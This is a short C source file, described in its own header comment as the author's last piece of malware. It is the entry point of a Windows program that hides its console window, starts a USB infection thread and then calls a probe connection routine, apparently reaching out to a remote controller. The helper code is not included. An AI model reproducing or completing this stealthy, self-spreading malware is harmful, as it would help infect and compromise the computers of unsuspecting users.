/*

Source code of the last malware I am ever going to write.

*/

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#include "probe.h"



int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE); // ^_^
    
    HANDLE ht = CreateThread(NULL, 0, USBINFECT, NULL, 0, NULL);  // Create Usb Infection thread
    if (ht == NULL)
    {
        exit(1);
    }

    ProbeConnect();
    
    return 0;
}
